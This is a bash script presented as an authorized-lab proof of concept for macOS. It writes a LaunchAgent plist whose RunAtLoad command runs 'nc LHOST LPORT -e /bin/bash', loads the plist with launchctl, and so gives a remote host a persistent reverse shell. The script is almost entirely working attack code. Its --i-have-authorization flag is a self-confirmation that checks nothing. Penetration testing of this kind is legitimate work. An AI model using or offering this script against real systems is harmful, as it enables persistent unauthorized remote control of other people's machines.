#!/bin/bash
# macOS LaunchAgent reverse-shell PoC — authorized lab use only.
#
# Writes a LaunchAgent .plist that connects a shell back to LHOST:LPORT on load.
# Requires an explicit --i-have-authorization flag so this can't be run by
# accident against a host you don't have permission to test.
#
# Usage: ./poc_reverse_shell.sh --lhost <ip> --lport <port> --i-have-authorization
# Author: SentinelByte

set -euo pipefail

LHOST=""
LPORT=""
AUTHORIZED=0

usage() {
    echo "Usage: $0 --lhost <ip> --lport <port> --i-have-authorization"
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --lhost) LHOST="$2"; shift 2 ;;
        --lport) LPORT="$2"; shift 2 ;;
        --i-have-authorization) AUTHORIZED=1; shift ;;
        *) usage ;;
    esac
done

if [[ -z "$LHOST" || -z "$LPORT" || "$AUTHORIZED" -ne 1 ]]; then
    echo "[-] Missing --lhost/--lport, or authorization not confirmed."
    usage
fi

NC_PATH="/bin/nc"
PLIST_NAME="com.user.revsh.plist"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"

echo "[*] Target listener: $LHOST:$LPORT"
echo "[*] Writing LaunchAgent reverse shell plist to: $PLIST_PATH"

cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.revsh</string>

    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>$NC_PATH $LHOST $LPORT -e /bin/bash</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

echo "[+] LaunchAgent created."
echo "[*] Loading LaunchAgent — make sure you are listening on $LHOST:$LPORT (e.g. nc -lvnp $LPORT)"

launchctl load "$PLIST_PATH"

echo "[*] Cleanup: launchctl unload '$PLIST_PATH' && rm '$PLIST_PATH'"
